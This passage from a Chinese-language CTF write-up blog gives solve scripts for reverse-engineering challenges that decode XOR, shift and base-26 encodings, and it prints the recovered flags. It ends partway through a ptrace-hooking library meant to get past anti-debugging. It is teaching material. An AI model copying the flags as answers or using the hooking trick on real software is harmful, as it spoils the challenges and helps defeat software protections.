operator">=</span> <span class="token number">129LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">206LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">202LL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">37</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" , "</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><p>得到 f 之後再丟進去 python</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">101</span> <span class="token punctuation">,</span> <span class="token number">102</span> <span class="token punctuation">,</span> <span class="token number">125</span> <span class="token punctuation">,</span> <span class="token number">108</span> <span class="token punctuation">,</span> <span class="token number">127</span> <span class="token punctuation">,</span> <span class="token number">87</span> <span class="token punctuation">,</span> <span class="token number">76</span> <span class="token punctuation">,</span> <span class="token number">74</span> <span class="token punctuation">,</span> <span class="token number">75</span> <span class="token punctuation">,</span> <span class="token number">75</span> <span class="token punctuation">,</span> <span class="token number">47</span> <span class="token punctuation">,</span> <span class="token number">33</span> <span class="token punctuation">,</span> <span class="token number">56</span> <span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">,</span> <span class="token number">21</span> <span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">,</span> <span class="token number">25</span> <span class="token punctuation">,</span> <span class="token number">89</span> <span class="token punctuation">,</span> <span class="token number">241</span> <span class="token punctuation">,</span> <span class="token number">211</span> <span class="token punctuation">,</span> <span class="token number">231</span> <span class="token punctuation">,</span> <span class="token number">245</span> <span class="token punctuation">,</span> <span class="token number">206</span> <span class="token punctuation">,</span> <span class="token number">247</span> <span class="token punctuation">,</span> <span class="token number">205</span> <span class="token punctuation">,</span> <span class="token number">215</span> <span class="token punctuation">,</span> <span class="token number">217</span> <span class="token punctuation">,</span> <span class="token number">232</span> <span class="token punctuation">,</span> <span class="token number">148</span> <span class="token punctuation">,</span> <span class="token number">160</span> <span class="token punctuation">,</span> <span class="token number">176</span> <span class="token punctuation">,</span> <span class="token number">135</span> <span class="token punctuation">,</span> <span class="token number">143</span> <span class="token punctuation">,</span> <span class="token number">154</span> <span class="token punctuation">,</span> <span class="token number">202</span> <span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">]</span></code></pre><p>題目有給前七個<code>g[i]</code>，所以我們可以透過這七個來推 m</p><pre class=" language-python"><code class="language-python">g <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">101</span> <span class="token punctuation">,</span> <span class="token number">97</span> <span class="token punctuation">,</span> <span class="token number">115</span> <span class="token punctuation">,</span> <span class="token number">121</span> <span class="token punctuation">,</span> <span class="token number">99</span> <span class="token punctuation">,</span> <span class="token number">116</span> <span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>m <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">//</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>得到 m 之後再把剩下的 g 算完就可以了！</p><pre class=" language-python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        g<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">*</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><strong>script</strong></p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">101</span> <span class="token punctuation">,</span> <span class="token number">102</span> <span class="token punctuation">,</span> <span class="token number">125</span> <span class="token punctuation">,</span> <span class="token number">108</span> <span class="token punctuation">,</span> <span class="token number">127</span> <span class="token punctuation">,</span> <span class="token number">87</span> <span class="token punctuation">,</span> <span class="token number">76</span> <span class="token punctuation">,</span> <span class="token number">74</span> <span class="token punctuation">,</span> <span class="token number">75</span> <span class="token punctuation">,</span> <span class="token number">75</span> <span class="token punctuation">,</span> <span class="token number">47</span> <span class="token punctuation">,</span> <span class="token number">33</span> <span class="token punctuation">,</span> <span class="token number">56</span> <span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">,</span> <span class="token number">21</span> <span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">,</span> <span class="token number">25</span> <span class="token punctuation">,</span> <span class="token number">89</span> <span class="token punctuation">,</span> <span class="token number">241</span> <span class="token punctuation">,</span> <span class="token number">211</span> <span class="token punctuation">,</span> <span class="token number">231</span> <span class="token punctuation">,</span> <span class="token number">245</span> <span class="token punctuation">,</span> <span class="token number">206</span> <span class="token punctuation">,</span> <span class="token number">247</span> <span class="token punctuation">,</span> <span class="token number">205</span> <span class="token punctuation">,</span> <span class="token number">215</span> <span class="token punctuation">,</span> <span class="token number">217</span> <span class="token punctuation">,</span> <span class="token number">232</span> <span class="token punctuation">,</span> <span class="token number">148</span> <span class="token punctuation">,</span> <span class="token number">160</span> <span class="token punctuation">,</span> <span class="token number">176</span> <span class="token punctuation">,</span> <span class="token number">135</span> <span class="token punctuation">,</span> <span class="token number">143</span> <span class="token punctuation">,</span> <span class="token number">154</span> <span class="token punctuation">,</span> <span class="token number">202</span> <span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">]</span>g <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">101</span> <span class="token punctuation">,</span> <span class="token number">97</span> <span class="token punctuation">,</span> <span class="token number">115</span> <span class="token punctuation">,</span> <span class="token number">121</span> <span class="token punctuation">,</span> <span class="token number">99</span> <span class="token punctuation">,</span> <span class="token number">116</span> <span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>m <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">//</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        g<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">*</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><blockquote><p>flag<br><code>easyctf{still_wasn't_too_bad,_right?}</code></p></blockquote><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>先丟進去 IDA Pro 看看<br>發現可以直接找到 flag 驚喜吧w<br><img src="https://i.imgur.com/zFyjRpM.png"></p><blockquote><p>flag<code>BreakALLCTF{4U49uY7OJCrJL0vtbXjd}</code></p></blockquote><h3 id="林思辰-find"><a href="#林思辰-find" class="headerlink" title="林思辰_find"></a>林思辰_find</h3><p><code>strings</code><br>運用<code>grep</code>來擷取關鍵字<br><img src="https://i.imgur.com/GWm0Vwq.png"></p><h3 id="林思辰-run-asm"><a href="#林思辰-run-asm" class="headerlink" title="林思辰_run-asm"></a>林思辰_run-asm</h3><p>先去看看檔案裏面有甚麼</p><pre class=" language-cpp"><code class="language-cpp">global _startsection <span class="token punctuation">.</span>text_start<span class="token operator">:</span>  mov rax<span class="token punctuation">,</span> <span class="token number">1</span>  mov rdi<span class="token punctuation">,</span> <span class="token number">1</span>  push <span class="token number">0x7d214e75</span>  push <span class="token number">0x525f646e</span>  push <span class="token number">0x345f6d53</span>  push <span class="token number">0x615f6531</span>  push <span class="token number">0x69706d30</span>  push <span class="token number">0x437b4654</span>  push <span class="token number">0x43747372</span>  push <span class="token number">0x6946794d</span>  mov rsi<span class="token punctuation">,</span> rsp  mov rdx<span class="token punctuation">,</span> <span class="token number">0x40</span>  syscall  mov rax<span class="token punctuation">,</span> <span class="token number">60</span>  mov rdi<span class="token punctuation">,</span> <span class="token number">0</span></code></pre><p>把<code>push</code>進去的東西拿出來看看<br>因為<code>push</code>是 FILO(先進後出)，所以順序是由底端到頂端<br><img src="https://i.imgur.com/sYEEnGK.png"></p><blockquote><p>flag<code>MyFirstCTF{C0mpi1e_aSm_4nd_RuN!}</code></p></blockquote><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><h3 id="林思辰-base64"><a href="#林思辰-base64" class="headerlink" title="林思辰_base64"></a>林思辰_base64</h3><p><img src="https://i.imgur.com/DaKF2gV.jpg"><br>把我們找到的那一串奇怪的字串拿去 base64 decode<br><img src="https://i.imgur.com/ZAB1qTJ.jpg"><br>發現是<code>push</code><br><img src="https://i.imgur.com/xNw21ZT.png"></p><blockquote><p>flag<code>MyFirstCTF{Y0U_FlnD_m4G1c_StRinG!!!}</code></p></blockquote><h3 id="林思辰-encrypt"><a href="#林思辰-encrypt" class="headerlink" title="林思辰_encrypt"></a>林思辰_encrypt</h3><p>丟進去 IDA Pro 看看<br>我們要做的事情是”找出加密的方法並解密一個特別的字串”</p><p>稍微美化一下 item 名稱之後看一下這個程式碼在做甚麼<br><img src="https://i.imgur.com/TuaTRzx.png"></p><blockquote><p>可以看到輸入的 39 個字會依照 ASCII 數值被拆成 3 種</p></blockquote><ol><li>1-31 || 127 ：<code>+0</code> -&gt; 1-31 || 127</li><li>32-81 ：<code>+45</code> -&gt; 77-126</li><li>82-126 ：<code>-50</code> -&gt; 33-76</li></ol><p>我們得到加密的方法了！<br>只要從字串的 ASCII 碼逆推回原本的數值就可以了<br>現在要來找特別的字串</p><p><code>shift+F12</code> 可以看到有一個奇怪的字串<br><img src="https://i.imgur.com/B8RgXik.png"></p><p>於是我們可以寫一個程式去跑這行字串</p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'zGs7@ABp"sIp/3bn@-:A-G]CllNNK'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    a <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">&lt;=</span><span class="token number">31</span> <span class="token operator">or</span> a<span class="token operator">==</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>a<span class="token operator">&lt;=</span><span class="token number">76</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>a<span class="token number">-45</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            </code></pre><p><img src="https://i.imgur.com/ZhsqK1D.png"></p><blockquote><p>flag <code>MyFirstCTF{Cae5Ar_ls_y0u??!!}</code></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        <bonus> MuMu's Oneline Python Solution    </bonus></div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> i <span class="token punctuation">:</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> enumerate<span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> a <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>description<br>先創一個 <code>[]</code> 裡面把所有原先的 array 的 0 去掉<br>然後用 <code>enumerate()</code> 去產數字跟迭代陣列 =&gt; <code>(0 , array[0]) =&gt; (1 , array[1])</code><br>產完利用 <code>map()</code> 把上面的 <code>enumerate()</code> 丟進去 <code>lambda function</code><br>取 <strong>數字跟陣列內容</strong>出來做運算然後轉 chr<br>再用 <code>"".join</code> 把結果的陣列全部串起來</p>    </div></div><h3 id="林思辰-mutate"><a href="#林思辰-mutate" class="headerlink" title="林思辰_mutate"></a>林思辰_mutate</h3><p>丟進去 IDA Pro 看看<br><img src="https://i.imgur.com/xpbk56b.png?80"></p><p>我們去看一下 a 裡面是甚麼(點兩下)<br><img src="https://i.imgur.com/0G4RadP.png"></p><p><code>shift+E</code> 導出數據，選擇 <strong>十進位 txt 檔案</strong><br><img src="https://i.imgur.com/Rr2dHmv.png?50"></p><p>透過<code>xor</code>的可逆性</p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">109</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">88</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">86</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">86</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">82</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">81</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">31</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">75</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">93</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">99</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">71</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">102</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">76</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">8</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">97</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">28</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">2</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">20</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">24</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">37</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">55</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">75</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">76</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">77</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">78</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token string">""</span>num<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                b <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>num<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>                num<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span></code></pre><h3 id="陳廷宇-XorZero"><a href="#陳廷宇-XorZero" class="headerlink" title="陳廷宇_XorZero"></a>陳廷宇_XorZero</h3><p>一個工具題<br>運用到一點點 <strong>XOR+詞頻分析</strong></p><p>可以丟到 <a href="https://wiremask.eu/tools/xor-cracker/">XOR Cracker</a>上面去解<br><img src="https://i.imgur.com/3ImrIAC.png"></p><p>把檔案下載下來<br><code>strings</code>就可以看到flag了<br><img src="https://i.imgur.com/jb4Mlet.jpg"></p><blockquote><p>flag <code>BreakAllCTF{X0r_1s_s0m37h1ng_funny}</code></p></blockquote><h3 id="林思辰-encode"><a href="#林思辰-encode" class="headerlink" title="林思辰_encode"></a>林思辰_encode</h3><p>丟進去 IDA Pro 看看<br><img src="https://i.imgur.com/m3cIa6r.png?80"></p><pre class=" language-python"><code class="language-python">v <span class="token operator">=</span> <span class="token number">44099282625849925</span>a <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp<span class="token operator">=</span>v<span class="token operator">-</span>j                <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">%</span><span class="token number">26</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        a<span class="token operator">+=</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        v<span class="token operator">=</span>tmp<span class="token operator">//</span><span class="token number">26</span>                        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag <code>MyFirstCTF{MAKECHRTOINT}</code></p></blockquote><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="ptrace-me"><a href="#ptrace-me" class="headerlink" title="ptrace_me"></a>ptrace_me</h3><p>hoo.c</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ptrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>gcc -fPIC -shared -o hook.so 